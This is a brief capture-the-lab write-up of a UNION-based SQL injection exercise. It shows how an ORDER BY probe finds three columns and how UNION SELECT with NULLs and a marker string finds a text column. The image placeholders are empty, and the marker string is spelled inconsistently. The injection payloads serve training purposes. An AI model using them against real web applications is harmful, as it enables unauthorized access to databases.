## Lab Description :

![image]()

## Solution :

Query made - 
```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

**ORDER BY 4** return an error, means there are 3 columns being queried and retreived by the web application.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
```

![image]()


#### Determine the column containng text data -

![image]()


We need to use the UNION SELECT payload  using 3 NULL values. Try thetring value *33eWHU* in one NULL value to see if it returns that string. If it does , then it means the column contains string data else it is not sting data.

**33eWHU in 1st NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT '3eWHU',NULL,NULL --
```

![image]()

**33eWHU in 2nd NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'33eWHU',NULL
```

![image]()

![image]()

![image]()


